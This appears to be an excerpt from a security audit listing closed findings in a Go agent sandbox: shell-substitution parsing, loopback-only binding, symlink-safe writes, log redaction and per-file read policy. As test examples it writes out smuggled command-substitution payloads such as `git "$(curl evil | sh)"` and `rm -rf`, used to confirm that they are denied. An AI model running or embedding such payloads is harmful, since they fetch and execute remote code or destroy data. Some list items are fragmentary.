## Verified fixes (Closed)

### F-01 — RCE via command substitution inside double quotes [CLOSED in `b861a28`]

**File**: `internal/sandbox/permissions.go:713-760` (added DQ-substitution recursion in `splitByShellOperators`)

The fix recurses into `$(...)` and `` `...` `` substitutions inside double-quoted strings, exactly mirroring the unquoted branch. Validated:

- `git "$(curl evil | sh)"` → splits inner; `curl` and `sh` surface as base commands → denied by allow-list.
- `echo "\`whoami\`"` → backtick recursed → `whoami` not allow-listed → denied.
- `git "$(echo $(rm -rf /tmp/x))"` → nested substitution unwound by outer + inner recursion → `rm` surfaces → denied.
- Single quotes `'$(should not split)'` correctly preserved opaque (bash semantics).
- Plain `$foo` parameter expansion (not a substitution) correctly NOT recursed.

**Regression tests**: `TestSubstitutionInsideDoubleQuotesIsSplit` and `TestExecQuotedSubstitutionDenied` in `permissions_test.go:1120-1196`. Coverage includes nested substitution and the explicit F-01 payload.

**Edge-case audit (no bypass found)**:
- Backslash escape `\$(` inside DQ: comment notes conservative over-deny — recurses anyway. Acceptable: false-positive denial is the safe failure mode.
- Process substitution `<(...)`/`>(...)`: not handled by name, but unquoted branch's split on `<` and `>` accidentally breaks them apart, with `(...)` failing `extractBaseCommand` allow-list. Safe by accident.
- ANSI-C `$'...'`: bash does not expand `$()` inside it; benign noise to the parser.
- Multibyte/whitespace between `$` and `(`: bash does not treat as substitution either; parser correctly does not recurse.
- Truncated `git "$(curl evil` (missing close): loop reads to EOF, recurses into `curl evil` → denied.

**Confidence: 100%** that the documented bypass payload is denied.

**Residual minor concern (informational, not flagged)**: backtick scanner does not honour escaped backticks inside DQ (`` "\`a\\\`b\`" ``). Bash would parse this as a single substitution `\`a\\\`b\``; the scanner sees only the first inner pair and recurses into `a\`. Result: `a` surfaces as base command → not allow-listed → denied. This is over-denial of a never-encountered shape. No action needed.

### F-09 — Bearer auth removed unconditionally; no `IsLoopback()` predicate [CLOSED in `746e527`]

**File**: `internal/transport/http.go:138-156`

`Start(ctx)` now refuses any TCP listener whose `Addr().(*net.TCPAddr).IP.IsLoopback()` is false, returns a typed error, and closes the listener if it owns it. `0.0.0.0:0` and `[::]:0` correctly fail this gate (regression test `TestHTTPServerStartRefusesNonLoopback` covers `0.0.0.0:0`). Unix-socket and other non-`*net.TCPAddr` listeners skip the check by design (filesystem perms gate them).

**Production trace**: `internal/daemon/daemon.go:154` binds explicitly to `127.0.0.1:0` — no production caller can trigger the refusal in normal operation.

**Confidence: 100%**.

### `7fcf593` — Strip `.exe` suffix in policy match [INFORMATIONAL — no security regression introduced]

**File**: `internal/sandbox/permissions.go:431-490, 591-595`

A new `stripExeSuffixFromLeadingWord` is invoked alongside existing `extractBaseCommand` so a policy rule like `go *` covers both `go test` and `go.exe test` on Windows. Audited for new-bypass shapes:

- Strip is single-pass; `git.exe.exe` becomes `git.exe`, which then fails `git`/`git *` glob matches (no double-strip). Windows would not auto-resolve `.exe.exe` either. No bypass.
- Length guard `len(leading) > 4` means a bare `.exe` is left intact — but `extractBaseCommand` returns it unchanged, and `.exe` is not allow-listed → denied. No bypass.
- Quoted leading word `"go".exe` is partially handled — `EqualFold` strips the trailing `.exe` from the literal `"go".exe` → `"go"` (with quotes). `globMatch("go", "\"go\"")` does NOT match the `go` allow rule. Result: false-positive denial of an unusual shape. **Over-deny, not bypass.**
- Case-insensitive (`EqualFold`): `.EXE`, `.Exe` all stripped — matches NTFS case-insensitivity. Correct.

**No new findings.** The change is policy-relaxing only on Windows and only for the leading binary; rest-of-command stays verbatim and goes through the same per-part check.

1. ~~**F-04 / F-07 / F-08 / F-25 (symlink + atomic-write cluster)**~~ — **closed in working tree** (post-scan, before report finalize). New `internal/safefs/` package: `CheckNoSymlinks` does a Lstat-walk from baseDir down (catches symlinks even when the leaf is missing — the F-04 root cause); `WriteFile` is the gated plain write; `WriteFileAtomic` adds tmp+rename for concurrent-writer scenarios. Affected-package suites (`safefs`, `sandbox`, `setup`, `client`) all pass.
2. ~~**F-11**~~ — **closed in working tree**. `tool.write` log event no longer carries `params.Content`; replaced with `bytes` (length) + `content_sha16` (first 8 bytes of SHA-256, hex). Audit trail intact (same write detectable by hash equality across time), payload no longer leaks. Regression test `TestHandlers_Write_DoesNotJournalRawContent` in `handlers_sandbox_test.go` plants a fake API key and asserts no Data field contains it.
3. ~~**F-02**~~ — **closed in working tree**. `Glob` filter loop and `Grep` per-file iteration now call `s.PolicyCheck("read", fullPath)` per match and silently drop denied files. A `read **/.env*` deny rule now keeps `dfmt_glob "*"` from listing `.env` and `dfmt_grep "API_KEY"` from surfacing its contents. Regression tests `TestSandboxGlobEnforcesPerFileReadPolicy` and `TestSandboxGrepEnforcesPerFileReadPolicy` plant a fake key in `.env` and assert neither path nor secret leak. Drop is silent (no count exposed) so the agent doesn't learn which paths were withheld.
4. ~~**F-19**~~ — **closed in working tree**. Two new semaphores on `Handlers`: `readSem` (depth 8) wrapping `Read`/`Glob`/`Grep`, and `writeSem` (depth 4) wrapping `Edit`/`Write`. Regression test `TestHandlers_Write_SemaphoreBoundsConcurrency` saturates writeSem with 4 blocked goroutines, then asserts a 5th `Write` returns `context.DeadlineExceeded` against a 100ms ctx — the precise behavior agents would observe under DoS.

Reserves `p1` for non-agent paths (operator-logged decisions, incident events). Regression test `TestHandlersRemember_OverridesSourceAndPriority` table-tests 7 spoof shapes and asserts both fields land correctly normalized in the journal event.

Regression test `TestEdit_FiresEditOpDenyRules` plants an `edit` deny rule, confirms `Edit` is rejected, and confirms the same path still passes a plain `write` check.
7. ~~**F-28**~~ — **closed in working tree**. New `normalizeFetchURLForPolicy` lowercases scheme + host before policy match (path/query verbatim — case-sensitive there is correct). Tests: `TestRedact_AWSSecretCrossLineAndCamelCase` (7 layouts), `TestRedact_AWSSecretFalsePositiveBounds` (no marker → no flag; 41 chars → no flag).
